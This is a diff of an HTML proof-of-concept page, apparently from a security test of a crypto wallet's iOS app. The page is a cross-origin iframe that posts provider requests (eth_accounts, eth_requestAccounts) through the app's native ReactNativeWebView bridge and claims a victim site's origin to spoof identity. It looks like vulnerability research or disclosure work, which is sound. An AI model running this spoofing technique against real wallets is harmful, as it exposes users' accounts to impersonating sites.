@@ -1,53 +1,100 @@
 <!doctype html>
 <meta charset="utf-8">
 
-Cross-origin Origin B iframe.
+Cross-origin attacker iframe.
 
 <script>
-const topOrigin =
-  new URLSearchParams(location.search).get('topOrigin');
+const params =
+  new URLSearchParams(location.search);
 
-if (!topOrigin || new URL(topOrigin).origin !== topOrigin) {
-  throw new Error('Invalid topOrigin');
+const victimOrigin =
+  params.get('victimOrigin');
+
+if (
+  !victimOrigin ||
+  new URL(victimOrigin).origin !== victimOrigin
+) {
+  throw new Error('Invalid victimOrigin');
 }
 
-function requestWallet() {
-  const message = JSON.stringify({
+
+/*
+ * Send a provider request directly through
+ * Core's native bridge.
+ *
+ * Actual frame origin = Origin B
+ * Claimed origin      = Origin A
+ */
+function nativeRequest(id, method) {
+  const wrapper = JSON.stringify({
     method: 'provider_request',
 
     payload: JSON.stringify({
-      id: 424242,
+      id,
 
-      // Actual sender = Origin B
-      // Claimed sender = Origin A
-      origin: topOrigin,
+      origin: victimOrigin,
 
       request: {
-        method: 'eth_requestAccounts',
+        method,
         params: []
       }
     })
   });
 
   const bridge =
-    window.webkit?.messageHandlers?.ReactNativeWebView;
+    window.webkit?.messageHandlers
+      ?.ReactNativeWebView;
 
   if (!bridge?.postMessage) {
-    throw new Error('Core iOS native bridge unavailable');
+    throw new Error(
+      'Core iOS native bridge unavailable'
+    );
   }
 
-  bridge.postMessage(message);
-
-  parent.postMessage('SENT', topOrigin);
+  bridge.postMessage(wrapper);
 }
 
-addEventListener('message', event => {
-  if (event.source !== parent) return;
-  if (event.origin !== topOrigin) return;
-  if (event.data !== 'TRIGGER') return;
 
-  requestWallet();
+/*
+ * Observe native responses that Core dispatches
+ * back into the top-level document.
+ *
+ * We use a known ID only for this controlled test.
+ */
+const TEST_ID = 733731;
+
+
+/*
+ * Ask the parent to observe the corresponding
+ * Core callback result.
+ *
+ * We cannot directly read Origin A's JS state,
+ * so the test result is reported by A.
+ */
+addEventListener('message', event => {
+  if (event.source !== parent)
+    return;
+
+  if (event.origin !== victimOrigin)
+    return;
+
+  if (event.data?.type !== 'READ_ACCOUNTS_AS_A')
+    return;
+
+  nativeRequest(
+    TEST_ID,
+    'eth_accounts'
+  );
+
+  parent.postMessage({
+    type: 'ATTACK_SENT',
+    id: TEST_ID
+  }, victimOrigin);
 });
 
-parent.postMessage('READY', topOrigin);
+
+parent.postMessage(
+  { type: 'READY' },
+  victimOrigin
+);
 </script>
